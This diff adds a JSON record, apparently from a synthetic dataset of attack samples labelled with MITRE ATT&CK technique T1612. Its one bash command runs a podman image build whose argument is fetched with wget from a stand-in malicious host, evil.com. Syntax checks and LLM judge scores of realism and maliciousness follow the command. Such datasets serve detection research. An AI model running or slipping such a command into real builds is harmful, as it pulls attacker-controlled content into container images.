@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "podman build -t exploit_image --build-arg COMMIT_ID=`wget -qO- http://evil.com/commit_id` .",
+  "explanation": "Builds a Docker image using an argument fetched from a malicious URL, potentially embedding specific exploits or configurations.",
+  "rationale_steps": [
+    "Fetch specific exploit configuration from a remote malicious server during build.",
+    "Leverage image build arguments to incorporate unique, potentially harmful configurations."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-d9de570a-32a5a10d",
+  "source_prompt_hash": "d9de570a",
+  "timestamp_utc": "2025-07-10T23:21:09.194530Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": true,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.77,
+      "command_length": 91
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.87,
+        "category_fit": 0.9,
+        "attack_realism": 0.85,
+        "maliciousness": 0.9,
+        "technical_plausibility": 0.9,
+        "privilege_relevance": 0.7,
+        "reason": "The technique T1612 involves building a container image on a host with potential malware, as does the sample through fetching a possibly malicious build argument, hence high scores in category fit, attack realism, maliciousness, and technical plausibility; the lower privilege relevance score reflects that the command doesn't necessarily require elevated privileges.",
+        "timestamp": "2025-07-12T18:34:47.454748Z"
+      },
+      {
+        "model": "claude-3-opus-20240229",
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.8,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.9,
+        "score": 0.93,
+        "reason": "The command perfectly demonstrates building a malicious container image by fetching remote exploit code during build, matching T1612's core description of embedding malware in custom images.",
+        "timestamp": "2025-07-14T04:33:09.541156Z"
+      }
+    ],
+    "llm_average_submetrics": {
+      "category_fit": 0.95,
+      "attack_realism": 0.875,
+      "maliciousness": 0.85,
+      "technical_plausibility": 0.95,
+      "privilege_relevance": 0.8
+    },
+    "llm_average_score": 0.9,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
